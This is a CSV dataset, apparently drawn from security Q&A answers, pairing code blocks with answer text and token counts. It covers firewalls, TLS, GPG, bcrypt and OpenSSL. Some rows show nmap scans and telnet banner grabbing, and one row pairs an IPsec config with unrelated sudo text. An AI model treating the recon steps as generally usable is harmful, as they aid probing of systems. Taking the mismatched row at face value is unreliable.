,CODE,TEXT,code_token_length,text_token_length,security_terms_count,has_code_construct
23372,"$ nmap 192.168.1.26

Starting Nmap 6.40 ( http://nmap.org ) at 2015-01-24 21:41 EST
Nmap scan report for TehPwner (192.168.1.26)
Host is up (0.00017s latency).
Not shown: 987 closed ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
902/tcp   open  iss-realsecure
912/tcp   open  apex-mesh
2869/tcp  open  icslap
5357/tcp  open  wsdapi
8081/tcp  open  blackice-icecap
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49163/tcp open  unknown
49176/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 2.30 seconds

$ nmap 192.168.1.26

Starting Nmap 6.40 ( http://nmap.org ) at 2015-01-24 21:42 EST
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn

Nmap done: 1 IP address (0 hosts up) scanned in 3.03 seconds

$ nmap 192.168.1.26 -Pn

Starting Nmap 6.40 ( http://nmap.org ) at 2015-01-24 21:42 EST
Nmap scan report for TehPwner (192.168.1.26)
Host is up (0.00090s latency).
Not shown: 996 filtered ports
PORT     STATE SERVICE
902/tcp  open  iss-realsecure
912/tcp  open  apex-mesh
2869/tcp open  icslap
5357/tcp open  wsdapi

Nmap done: 1 IP address (1 host up) scanned in 49.29 seconds
","TL;DR It protects against having to manually configure services to only listen on localhost, as you have to manually allow them network connectivity, and it increases the effort an attacker must exert to recon your box. This means it's an effective tool both against attackers and poor configuration.  Yes, you should run a firewall. Detail Ports have 2 main states: Open (Service is listening) Closed (There is nothing listening) You appear to be familiar with the two states - ports default to ""closed"", switching to ""open"" if there is a service listening.  It's very fast to enumerate both open and closed ports - the OS will actually send a response saying either ""there is a service here"" (port is open), or one saying ""there is no service here"" (port is closed). If you use a firewall, it provides the option to filter ports.  For filtered ports, the OS does not respond at all.  This means an attacker must invest more time to determine port states, as they have no way to know if the computer didn't send any response, or if the response was lost in transit. Additionally, if you're running a firewall, you protect yourself against accidentally exposing additional services to the Internet. I've included a sample scan of my desktop with my firewall off (pay special attention to the number of ports discovered, and how long the scan took): {code-blk}",453,315,2,True
23375,"0 – never send the referring URL.
1 – send only when links are clicked.
2 – send for links and images (default).

0 – always send referrer (default).
1 – only send if base domains match.
2 – only send if hosts match.

0 – send full URI (default).
1 – scheme, host, port and path.
2 – scheme, host and port.
","I will focus my answer in not so basic actions you can do to improve your security, add-ons and basic configuration i assume most security awaraness people already know so. Go to about:config then search for : security.ssl.require_safe_negotiation Set to it to true security.warn_viewing_mixed Set it to true security.xpconnect.plugin.unrestricted Set it to false (that may break plugins i didn't test it with the add-ons mentioned above if anyone can test that would be very good since i can't at moment) privacy.trackingprotection.enabled Set it to true Also search for ""rc4"" (on the same config page!) disable all of then rc4 is insecure on that way you enforce stronger ciphers when establishing an SSL connection. network.http.sendRefererHeader {code-blk} Recommended : 2 Set network.proxy.socks_remote_dns (in about:config) to true to force Firefox to make DNS requests through the proxy. Otherwise you can leak DNS requests to your local provider.(thanks @pseudon) Thats all i remember for now since i can't acess a desktop only firefox for android if anyone knows more to add to list feel free to edit/comment",97,327,1,True
23381,"if (n == 0L) {
  /* Get pubkey from cert */
  EVP_PKEY *clkey = X509_get_pubkey(s->session->peer);
  if (clkey) {
    if (EVP_PKEY_cmp_parameters(clkey, skey) == 1)
      dh_clnt = EVP_PKEY_get1_DH(clkey);
  }
  if (dh_clnt == NULL) {
    al = SSL_AD_HANDSHAKE_FAILURE;
    SSLerr(SSL_F_SSL3_GET_CLIENT_KEY_EXCHANGE,
    SSL_R_MISSING_TMP_DH_KEY);
    goto f_err;
  }
  EVP_PKEY_free(clkey);
  pub = dh_clnt->pub_key;
} else
  pub = BN_bin2bn(p, i, NULL);
if (pub == NULL) {
  SSLerr(SSL_F_SSL3_GET_CLIENT_KEY_EXCHANGE, SSL_R_BN_LIB);
  goto err;
}
","In the end, the following hypothesis from my question above proved to be true: I can see how a bug in OpenSSL could allow an attacker to bypass authentication, for example if OpenSSL would accept DH parameters in the Client Key Exchange message, i.e. if OpenSSL did not properly enforce this part of RFC 5246, section 7.4.7 This code comes from the {code-blk} Thus an attacker could provide a certificate and perform the DH key exchange using another public key than the one in the certificate! For some reason, the OpenSSL developers choose not to require an empty Client Key Exchange message when the client provides a DH cert. (Even though this is required by the RFC.) The reason why the fix from the OpenSSL team does not break client authentication with DH certs is the ssl3_get_cert_verify() function is not called if ssl3_get_client_key_exchange() read the key from the certificate. The logic is somewhat convoluted but... well, it works!",303,239,1,True
23383,"$ strings /lib64/libc.so.6 | grep -i gnu
gnu_dev_makedev
gnu_get_libc_release
gnu_get_libc_version
gnu_dev_minor
gnu_dev_major
GNU C Library stable release version 2.12, by Roland McGrath et al.
Compiled by GNU CC version 4.4.7 20120313 (Red Hat 4.4.7-4).
        GNU Libidn by Simon Josefsson
<http://www.gnu.org/software/libc/bugs.html>.

# for dl in /usr/lib/system/lib*.dylib; do echo $dl; strings $dl | grep -i gnu; done
...trimmed...
/usr/lib/system/libunwind.dylib
malformed DW_CFA_GNU_negative_offset_extended dwarf unwind, reg too big
...trimmed...
","OS X is based on a BSD derivative, Darwin, which does not typically use GNU libc.  So my expectation is that the answer is ""no"".  That the {code-blk}).",243,49,1,True
23398,"BOOL WINAPI ImpersonateLoggedOnUser(
  _In_  HANDLE hToken
);
","Android essentials does when installing applications.  Each app gets a group assigned to it, and only that group can access the data for the app.  In a Unix based system this is rather simple to implement.  Windows gets a bit harder. Access Control Lists What you can do is  for your application.  These can be converted into Security Descriptors which can be used with functions like CreateDirectory.  The DACL will contain all the information about who can access the folder.  In this case you'll probably want to create a Windows group for the application. When you create your directory you can restrict access to the DACL you create.  When your application runs/needs to access the directory it acquires the DACL, and uses it in subsequent system calls.  These aren't the easiest Windows object in the world to work with, but they do what you want. Creating Users You can create a User Profile in Vista+.  More than a little tricky because Windows wasn't designed for this.  Impersonating a logged on user requires some type of access token for the user you're attempting to use.  There are  that would return such a token: {code-blk} access. LogonUser requires a password.  You probably don't want to hardcode one into your application.  DuplicateToken only generates impersonation tokens, which can't be used with CreateProcessAsUser (which is our end goal).  Now we're left with a bunch of functions that require an existing token to duplicate and start from.  That means you're left with the current user's token which is not what you want. Creating tokens is pretty much out of the question.  That operation is often only done by LSASS, and I wouldn't be surprised if this whole behavior was flagged by Anti-viruses.  In Windows this approach is probably a bad idea, and not worth the amount of flaming hoops you would have to jump through to make it work.",28,445,3,True
23407,"root@debian:~# telnet 193.231.X.Y 22
Trying 193.231.X.Y...
Connected to 193.231.X.Y.
Escape character is '^]'.
SSH-2.0-OpenSSH_5.5p1 Debian-6+squeeze5
^]
telnet> cl
Connection closed.
root@debian:~#

root@debian:~# telnet localhost 80
Trying ::1...
Connected to localhost.
Escape character is '^]'.




GET / HTTP/1.0

HTTP/1.1 200 OK
Date: Tue, 10 Feb 2015 11:44:04 GMT
Server: Apache/2.2.16 (Debian)
Last-Modified: Thu, 30 Oct 2014 20:09:38 GMT
ETag: ""c357-b1-506a975bb4480""
Accept-Ranges: bytes
Content-Length: 177
Connection: close
Content-Type: text/html

<html><body><h1>It works!</h1>
<p>This is the default web page for this server.</p>
<p>The web server software is running but no content has been added, yet.</p>
</body></html>
Connection closed by foreign host.
root@debian:~#
","Apart from nmap, try to telnet the ports yourself. Some servers provide headers, like SSH does (this is how nmap identifies the ports): {code-blk} And, if you have access on some host on the same LAN/VLAN, look in the ARP Cache table and check the MAC OUI (first three bytes of the mac address), then look it up on the net, getting the vendor name (). Usualy some PC/Server NIC is not manufactured in the same plant asa a switch (there are exceptions, take HP for example, but not Cisco or Juniper, they don't manufacture PCs or Servers).",307,156,2,True
23410,"Http                    Https

+------------------+    +------------------+
|7 http  methods   |    | http methods     |  <---same No change needed
+------------------+    +------------------+
|6 data:ex)""$1000"" |    | data:ex)""kf4d3s1""|  <---data encrypted
+------------------+    +------------------+
|5 Sock:           |    | Sock:            |
+------------------+    +------------------+
|4 TCP :           |    | TCP:             |
+------------------+    +------------------+
|3 IP :            |    | IP :             |
+------------------+    +------------------+
|2 PPP:            |    | PPP:             |
+------------------+    +------------------+
|1 RJ45:           |    | RJ45:            |
+------------------+    +------------------+


7.  Application Layer  -> Http
6.  Presentation Layer -> MIME SSL TLS XDR <---- This is what you want
5.  Session Layer      -> Sockets
4.  Transport Layer    -> TCP UDP SCTP DCCP
3.  Network Layer      -> IP IPsec ICMP IGMP OSPF RIP
2.  Data link Layer    -> PPP,SBTV,SLIP
1.  Physical Layer     -> FDDI, B8ZS, V.35, V.24, RJ45.
",{code-blk} Only the ways of negotiate/handshake change for added encryption. HTTPS encrypts an HTTP message(data) prior to transmission and decrypts it upon arrival,358,43,1,True
23420,"   certificate_list
      This is a sequence (chain) of certificates.  The sender's
      certificate MUST come first in the list.  Each following
      certificate MUST directly certify the one preceding it.  Because
      certificate validation requires that root keys be distributed
      independently, the self-signed certificate that specifies the root
      certificate authority MAY be omitted from the chain, under the
      assumption that the remote end must already possess it in order to
      validate it in any case.
","All browsers inherently trust DigiCert True enough. (and I assume it's intermediate CA?) Clients may include trusted intermediate certs, but cannot be expected to.  It is your job, the server, to provide any intermediate certificates necessary to validate your certificate chain up to the root (): {code-blk} The only thing I can see is if the client doesn't have one of the intermediate certificates installed it can ask my web server for it (and verify it against the in-browser DigiCert root)? Correct.  That's exactly the reason.",92,128,1,True
23425,"542208 (pie of decreasing time)
Server at 192.168.10.3

389578 (pie of decreasing time)
Server at 192.168.10.4
","Google Authenticator is a offline authenticator. It can both be time-based or event based. Time-based means it will use a Clock to detect the correct code to display. To prevent desynchronization because the Clocks are imprecise, you simply have a correction factor, so you configure the server to accept a previous code, current code, or a later code. If a previous code is used, you store ""-1"" in database. If a later code is used, you store ""+1"" in a database. And then you decrease or increse the number according to syncronization. ""-1"" would then mean you accept the code corresponding to time -2, time -1 and time. ""+2"" would then mean you accept the code corresponding to time +1, time +2, and time +3 A important thing is to store the time of the last accepted code, so codes that are equal or previous to the used code cannot be reused. Since the authenticator is completely time-based, it will mean the same key can be used for unlimited number of servers. Please note that if servers are offline or cannot talk with each other, then a spent code from a machine can be reused at Another machine, provided it hasnt expired in time. You can also use a Event-based setting, with a counter that Counts up for each display of the code, and then you simply accept all codes that are up to lets say 50 events in future, and then store the Count of the last used code so codes cannot be reused, but then you need one unique key for each machine. The KeyURI format is to initalize the Google Authenticator, normally you embed the KeyURI in a QR code displayed on screen on account setup, and then you scan it with Google Authenticator to add the seed to Google Authenticator. You simply type a friendly name as ""label"", for example: ""Server at 192.168.10.3"" And then when you look in Google authenticator, you might see: {code-blk} and so on. Then you know which code you should type in.",34,472,2,True
23429,"Field           Purpose                          Updated when...               Size (Bytes)
Version         Block version number             You upgrade the software and   4
                                                 it specifies a new version 

hashPrevBlock   256-bit hash of the previous     A new block comes in          32
                block header    
hashMerkleRoot  256-bit hash based on all        A transaction is accepted     32
                the transactions in the block       

Time            Current timestamp as seconds     Every few seconds              4
                since 1970-01-01T00:00 UTC  

Bits            Current target in compact format   The difficulty is adjusted   4

Nonce           32-bit number (starts at 0)       A hash is tried (increments)  4
","Do bitcoin miners(or some of them) accept customizable inputs and hash them in bulk(instead of accepting some more high-level instruction and do mining works automatically)? Bitcoin miners generally take a parameter called ""target"" and ""header"" and return a nonce+overflow.  I don't think it's possible to hash X times, resulting in predictable output (e.g. you want to compare hashes).  The Bitcoin game is one of ""finding a lower number"" and ""hash as fast as you can until you do"". Yes, Bitcoin is literally comparing the SHA2 output of two values as a BigInteger and should only return when this is found.  (maybe what you need is possible, but I would think this feature would introduce inefficiencies for the Bitcoin game and would be undesirable) Here is what goes on inside bitcoin miners: Note: step 3 and 4 is Bitcoin Hardware, the rest is your custom driver software Step 1 At a high level, the miner software takes a list of active transactions, and then groups them together in something called a ""block"". Or more accurately stated: The miner software coverts all the transactions into a summary view called a  ""merkle root"", and hashes it, which is representative of the transactions. Step 2 Then mining software converts this to into a binary format called a , which also references the previous blocks (also called a chain). {code-blk} Summary So at the end of the day, all a miner does is: Take a block header as input Change the Nonce Test if the Block Header hash is less than the Target.  If it is, you win. Go to step 2  (or go to step 1 if someone else won the block)",137,395,2,True
23430,"$ gpg --version
gpg (GnuPG) 1.4.16
Copyright (C) 2013 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Home: ~/.gnupg
Supported algorithms:
Pubkey: RSA, RSA-E, RSA-S, ELG-E, DSA
Cipher: IDEA, 3DES, CAST5, BLOWFISH, AES, AES192, AES256, TWOFISH,
        CAMELLIA128, CAMELLIA192, CAMELLIA256
Hash: MD5, SHA1, RIPEMD160, SHA256, SHA384, SHA512, SHA224
Compression: Uncompressed, ZIP, ZLIB, BZIP2
$ file test*
test1.txt: ASCII text
test2.txt: ASCII text
$ gpg --cipher-algo TWOFISH -c test1.txt 
Enter passphrase: 
Repeat passphrase: 
$ gpg --cipher-algo AES256 -c test2.txt 
Enter passphrase: 
Repeat passphrase: 
$ file test*
test1.txt:     ASCII text
test1.txt.gpg: GPG symmetrically encrypted data (TWOFISH cipher)
test2.txt:     ASCII text
test2.txt.gpg: GPG symmetrically encrypted data (AES256 cipher)
$ 
","Updated: For Gpg4win, I see two options: For S/MIME, the GUI has a place to set it (Settings -> Configure Kleopatra -> GnuPG System -> GPG for S/MIME -> Use cipher algorithm) Otherwise, you have to alter the underlying gpg.conf file @jens-erat has already more knowledgeably described the latter, but I will offer the following inputs based on playing with it myself: The command line gpg you're going to use is %INSTALLDIR%\gpg2.exe; on my system that worked out to C:\Program Files (x86)\GNU\GnuPG You can find out your homedir (where you need to put gpg.conf) by running {code-blk}",397,199,1,True
23438,"Processing triggers for ca-certificates ...
Updating certificates in /etc/ssl/certs... 0 added, 1 removed; done.
Running hooks in /etc/ca-certificates/update.d....
Removing debian:A-Trust-nQual-03.pem
done.
done.
","By trusting the Root CA you're trusting their judgement in who they sign.  As long as the intermediate CA is valid, not revoked, and you're trusting the Root CA... the chain will always be verified.  Other applications (such as FireFox) can add additional checks and functionality to check for untrusted intermediate certificates, but unless the application provides it it's not really part of the SSL/TLS specification. To remove trusted root CAs you can perform the following: {code-blk} is updated appropriately. I performed all of this on a Debian based system.",82,134,1,True
23445,"Login Attempt              Artificial Delay
1                          0
2                          1 second
3                          2 seconds
4                          4 seconds
5                          8 seconds
","Yes, the account should be locked out. The reason is that the successful login could be from the real user, and the failed logins could be from an attacker. The fact that the real user has logged in should not reset the counter for the attacker. Of course you could track sessions and only lock out the user if they are on a different session than the real user, however here there is more risk of implementation bugs meaning you could inadvertently introduce something that allows an attacker to work around the lockout. With security it is often best to keep things as simple as possible. You should also rate limit repeated attempts from the same IP address as that will help protect against a horizontal attack against different user accounts. The above is comment on your current proposal, however I would also go for an increasingly delayed response rather than locking out. e.g. {code-blk} That way the real user will be able to log in during a brute force on their account and the attacker cannot cause a Denial of Service on the legitimate user. For longer delays you could display something to the user to show that their login is in progress so they would not be tempted to click again. Of course you do not want the maximum delay to be much longer than several seconds, however adding an artificial delay across threads will delay an attacker. The difference between slowing down login and showing an account locked out message is that the real user will not have to keep submitting their login details - they just need to be patient while login is progressed.",22,328,1,True
23453,"1/23/2014  Intel Core i7-2700K CPU @ 3.50 GHz

| Cost | Iterations        |    Duration |
|------|-------------------|-------------|
|  8   |    256 iterations |     38.2 ms | <-- minimum allowed by BCrypt
|  9   |    512 iterations |     74.8 ms |
| 10   |  1,024 iterations |    152.4 ms | <-- current default (BCRYPT_COST=10)
| 11   |  2,048 iterations |    296.6 ms |
| 12   |  4,096 iterations |    594.3 ms |
| 13   |  8,192 iterations |  1,169.5 ms |
| 14   | 16,384 iterations |  2,338.8 ms |
| 15   | 32,768 iterations |  4,656.0 ms |
| 16   | 65,536 iterations |  9,302.2 ms |

String HashPassword(String password)
{
   return BCrypt.HashPassword(password, BCRYPT_DEFAULT_COST);
}
","Short Version The number of iterations that gives at least 250 ms to compute Long Version When BCrypt was first published, in 1999, they listed their implementation's default cost factors: normal user: 6 super user: 8 A bcrypt cost of 6 means 64 rounds (26 = 64). They also note: Of course, whatever cost people choose should be reevaluated from time to time At the time of deployment in 1976, Unix's And ideally this would be part of everyone's BCrypt library, so rather than relying on users of the library to periodically increase the cost, the cost periodically increases itself.",261,139,1,True
23468,"bool VerifySignature(byte[] file, byte[] signature)
{
    using (var rsa = new RSACryptoServiceProvider())
    {
        rsa.ImportCspBlob(PublicKey);
        return rsa.VerifyData(file, CryptoConfig.MapNameToOID(""SHA256""), signature);
    }
}
","From what you described, it's not secure at all, for a bunch of reasons. The top two being: You're downloading data over HTTP. Even if AES provides confidentiality, it doesn't provide message authenticity or integrity. You're using hard-coded keys. Pulling those out would be trivial, even with obfuscation. This would mean I could MitM your traffic and send arbitrary binaries to take over the system. You're relying upon obfuscation of the process for security, which is in violation of . The good news is that there is a proper way to do this, with asymmetric cryptography: Generate an RSA key pair. Store the public key components within your application. Hash the assemblies on the server-side and sign that hash with the RSA private key. Deliver the signed hash and assemblies over HTTPS to your application. Hash the downloaded binary, then use the public key to verify the hash against the signature. If the signature matches, you're safe to use the binaries. You can do all of this with {code-blk} on the RSA instance that generated your key pair.",94,263,1,True
23470,"gpg: assuming signed data in `enigmail-1.8-tb+sm.xpi'
gpg: Signature made Tue Mar 17 13:31:23 2015 CET
gpg:                using RSA key 0xDB1187B9DD5F693B
gpg: Good signature from ""Patrick Brunschwig <patrick@enigmail.net>""
gpg:                 aka ""Patrick Brunschwig <patrick@brunschwig.net>""
gpg:                 aka ""[jpeg image of size 13251]""
gpg: WARNING: This key is not certified with a trusted signature!
gpg:          There is no indication that the signature belongs to the owner.
Primary key fingerprint: 4F9F 89F5 505A C1D1 A260  631C DB11 87B9 DD5F 693B
","OpenPGP Signatures vs. Checksums Verifying an OpenPGP signature not only checks whether a file was not corrupted (for example during transmission) like a ""normal"" SHA or MD5 checksum would do, but also checks whether the signature was issued by whom it pretends to be from (in other words, if the signature on the file was issued by a specific key, which is also referenced in the signature). Fetching the Right Key You need to fetch this (public) key before being able to verify the signature. This can easily be achieved by running {code-blk} Now you know that the key was really used to sign the file you downloaded (""Good signature from [...]""). Still, this key could have been issued by everybody! Just because you fetched a key from the key servers, . Having the key will not suffice to be sure who (which person) really signed the file: WARNING: This key is not certified with a trusted signature! There is no indication that the signature belongs to the owner. You also need to be able to verify the key to not only verify the file integrity (you already achieved that now), but also be sure whom it comes from. For example by meeting the issuer and asking him whether it's really his key,  (or another way you consider reliable). But this is another, long topic.",217,302,2,True
23518,"#!/usr/sbin/setkey -f
#
# SPD for gateway A (172.16.72.1)
#
spdadd 192.168.1.0/24 10.42.23.0/24 any -P out ipsec
       esp/tunnel/172.16.72.1-172.16.72.254/require
       ah/tunnel/172.16.72.1-172.16.72.254/require;
spdadd 10.42.23.0/24 192.168.1.0/24 any -P in ipsec
        esp/tunnel/172.16.72.254-172.16.72.1/require
        ah/tunnel/172.16.72.254-172.16.72.1/require;
    # AH SAD entries with 160 bit keys
add 172.16.72.254 172.16.72.1 ah 0x200 -A hmac-sha1         0x46915c30ed7e2465b42861b6ab19f2772813020c;
add 172.16.72.1 172.16.72.254 ah 0x300 -A hmac-sha1 0xc4dac594f8228e0b94a54758f7fbf2fdf4e37f3e;

 add (signifying an ipsec auto --add), 
route (signifying that plus an ipsec auto --route), 
start (signifying that plus an ipsec auto --up), 
manual (signifying an ipsec manual --up), 
and ignore (also the default) (signifying no automatic startup operation). 
","I found a question and answer related to keys and group policy here . Also, the code listed at the link is: edit the Sudo User With: {code-blk} This is not entered at the terminal, but run as a script!",379,56,1,True
23529,"  string    signature format identifier (as specified by the
            public key/certificate format)
  byte[n]   signature blob in format specific encoding.

  string    ""ssh-dss""
  mpint     p
  mpint     q
  mpint     g
  mpint     y

   ssh-dss           REQUIRED     sign   Raw DSS Key
   ssh-rsa           RECOMMENDED  sign   Raw RSA Key
   pgp-sign-rsa      OPTIONAL     sign   OpenPGP certificates (RSA key)
   pgp-sign-dss      OPTIONAL     sign   OpenPGP certificates (DSS key)
",Found the answer myself in : Signatures are encoded as follows: {code-blk},150,23,1,True
23531,"HTTP/1.1 200 OK
Content-type: text/html
Set-Cookie: foo=10
Set-Cookie: bar=20; Expires=Fri, 30 Sep 2011 11:48:00 GMT
... rest  of the response

GET /spec.html HTTP/1.1
Host: www.example.com
Cookie: foo=10; bar=20
Accept: */*
","Answer 1: if the server uses SSL/HTTPS(verified  by third party-not self-signed certificate), cookies and session IDs travel as cipher-text over the network, and if an attacker (Man in the Middle) uses a packet sniffer, they can not obtain any information. They can not decrypt data because the connection between client and server is secured by a verified third party.so HTTPS without verified certificate means server and user can not make sure that session ID is not sniffed. it means that every data (i.e cookies) must be send and receive after establishing a secured HTTPS between user and server and can make sure that the session ID is securely sent to the user. also asymmetric cipher just use for exchanging key of symmetric cipher(that is used for ciphering data between client and server). for better image right click: open image in new window Answer 2: Cookies are handled entirely by the request header in HTTP header fields, cookies in the client side are encoded in the 'Cookie' and 'Set-Cookie' response header and in the server side are encoded in the 'Cookie' request header - $Path variable. Client request example: {code-blk}",89,279,3,True
23532,"@ setlocal enableextensions 
@ cd /d ""%~dp0""

for /R %%a in (*.exe) do (

netsh advfirewall firewall add rule name=""Blocked with Batchfile %%a"" dir=out program=""%%a"" action=block

)
","You can use a Simple Batch File.  Open Notepad and copy/paste the script below into a blank document.  Save the file as BLOCKALL.BAT.  Now copy that file to the same directory as the EXEs you want to block and double click it.  It will add outbound rules to advanced Windows Firewall settings blocking all EXEs in that folder and sub-folders as well. It is tested with Windows 7, but it should work with other versions of Windows that use Windows Firewall. NOTE: Batch starts itself in system32. Thus you need to prepend it with {code-blk}",75,136,1,True
23540,"[Client] <=========================> [Proxy] <=======================> [Server]
           Connection using fake               Connection using real
           user-installed cert/key             server cert/key
","Is there a way for the server to know that requests have been intercepted? No, because the communication with the server does not use the custom-installed MITM certificate. That certificate is only used by the client when communicating with the proxy. {code-blk} The server only knows that it is communicating with some client. The server has no idea that that client is actually a proxy acting on behalf of another client. The proxy-to-server connection is a perfectly genuine HTTPS connection, using the server's real key and certificate. The connection between the client and the proxy is where something fishy is going on. The proxy knows that the certificate isn't genuine, but the proxy is controlled by the person orchestrating the MITM attack, so that's perfectly reasonable.",84,171,1,True
23564,"
<<< TLS 1.2 Handshake [length 030f], ServerKeyExchange
    0c 00 03 0b 01 00 ff ff ff ff ff ff ff ff c9 0f
    da a2 21 68 c2 34 c4 c6 62 8b 80 dc 1c d1 29 02
    4e 08 8a 67 cc 74 02 0b be a6 3b 13 9b 22 51 4a
","So I decided to put my comment to ""StackzOfZtuff"" answer in a new post, as you can actually dissect the key exchange in more detail with this method. This answer is copied from  post over at superuser.com (so all thanks go Thomas Pornin): use openssl with its -msg option yields the information we care for {code-blk} according to Thomas Pornin you can read it this way (I copied the following verbatim): 0c 00 03 0b: message of type ""ServerKeyExchange"" (that's the ""0c"") of length 0x00030B bytes. First element is the DH modulus as a big integer, with a two-byte length header. Here, the length is encoded as 01 00, meaning an integer encoded over 0x0100 bytes. That's 256 bytes, so the modulus has length between 2041 and 2048 bits. The modulus bytes follow, in unsigned big-endian order. The top bytes of that modulus are, in this case, ff ff ff ff.... The modulus then has length exactly 2048 bits. Using this method you can also make sure, that your server doesn't use the DH Groups predefined in RFC 3526 (which my Apache2.4.7 using Ubuntu 14.04 still does, although  states that this version should use DH parameters added to the PEM-encoded SSLCertificateFile).",122,349,1,True
23574,"  Since requests directed ultimately to AS112 servers are usually
  triggered automatically by applications, review of firewall logs
  may indicate a large number of policy violations occurring over an
  extended period of time.

  Where responses from AS112 servers are blocked by firewalls, hosts
  will often retry, often with a relatively high frequency.  This
  can cause inbound traffic to be misclassified as a denial-of-
  service (DoS) attack.  In some cases, the source ports used by
  individual hosts for successive retries increase in a predictable
  fashion (e.g. monotonically), which can cause the replies from the
  AS112 server to resemble a port scan.

  A site administrator may attempt to perform active measurement of
  the remote host in response to alarms raised by inbound traffic,
  e.g. initiating a port scan in order to gather information about
  the host which is apparently attacking the site.  Such a scan will
  usually result in additional inbound traffic to the site
  performing the measurement, e.g., an apparent flood of ICMP
  messages that may trigger additional firewall alarms and obfuscate
  the process of identifying the originally problematic traffic.
","Is this a spoofed SYN flood? At first glance, this may look like an attack. An attacker can initiate a SYN Flood without using his real IP address. An attacker crafts a packet with an origin IP of a known IP such as that of a blackhole dns server. Your server may exhaust resources while attempting to respond with a SYN-ACK packet. How can I tell If your server does respond with a SYN-ACK packet, then the original packet is likely spoofed if the server doesn't respond with a final ACK packet. Why am I seeing TCP traffic for DNS? Per A request sent to one of these servers will result in a response being returned to the client.  The response will typically be a UDP datagram, although it's perfectly valid for requests to be made over TCP. In both cases, the source port of packets returning to the site that originated the DNS request will be 53. Explanations provided by RFC6305 Section 6 of  provides further explanations of why you may see this traffic. Inbound Traffic from AS112 Servers Where firewalls or intrusion detection systems (IDSs) are configured    to block traffic received from AS112 servers, superficial review of    the traffic may seem alarming to site administrators. {code-blk}",249,296,2,True
23581,"gpg> setpref uncompressed 
Set preference list to:
     Cipher: 3DES
     Digest: SHA1
     Compression: Uncompressed
     Features: MDC, Keyserver no-modify
","OpenPGP Algorithm Defaults These are the algorithms you prefer others to use when they send encrypted messages to you. To print and change those settings, use {code-blk} Defaults might be different based on  used.",45,54,1,True
23589,"create table Contact (
    contact_id INT PRIMARY KEY,
    ...
);

create table Contact_ACL (
    contact_id INT REFERENCES Contact(contact_id),
    username varchar(100),
    permission varchar(20)
);

from contact in Contact
join acl in Contact_ACL on contact.contact_id equals acl.contact_id
where acl.username == <username>
select new {
    contact.contact_id,
    ...,
    acl.permission
}
","I will post an alternate solution to the one that is proposed in MSDN's ""Granting Row Level permissions in SQL Server"": . In my solution, you have a meta table for each table where row level permissions are required. I like to call that meta table as an ACL (Access Control List) table. So as an example, your target table is called Contacts, then you create another table call Contacts_ACL. Now in that table, I put in Contact_Id, User_Id and Permission (or Permission_Id if we have a separate Permissions table). {code-blk}",132,143,3,True
23599,"   close_notify
      This message notifies the recipient that the sender will not send
      any more messages on this connection.  Note that as of TLS 1.1,
      failure to properly close a connection no longer requires that a
      session not be resumed.  This is a change from TLS 1.0 to conform
      with widespread implementation practice.
","In practice, many widely deployed HTTPS servers close connections abruptly, without any prior notice, and in particular without the {code-blk}.",69,33,1,True
23644,"   certificate_list
      This is a sequence (chain) of certificates.  The sender's
      certificate MUST come first in the list.  Each following
      certificate MUST directly certify the one preceding it.  Because
      certificate validation requires that root keys be distributed
      independently, the self-signed certificate that specifies the root
      certificate authority MAY be omitted from the chain, under the
      assumption that the remote end must already possess it in order to
      validate it in any case.
","The server does not send any certificate in the {code-blk} which is clear enough. Note that, in all generality, the certificate chain is not unique. A given server certificate could be amenable to validation through several, possibly many certificate chains. This naturally happens upon intermediate CA certificate renewal (because there will be a time when the new CA certificate is valid and the old one is still valid, so if they use the same key then they will be interchangeable). In the case of cross-certification between distinct CA, the several chains for a given server certificate may even lead to distinct root CA. The consequence is that while the SSL/TLS server is supposed to send a ""valid chain"", that chain may not necessarily be the one that the client would have preferred. In general, SSL/TLS clients will try to validate the server certificate chain as received from the server. If that chain does not please the client, then the client's behaviour depends on the implementation: some clients simply give up; others (especially Windows/Internet Explorer) will try to build another chain using locally known intermediate CA and also downloading certificates from URL found in other certificates (the ""authority information access"" extension).",92,255,1,True
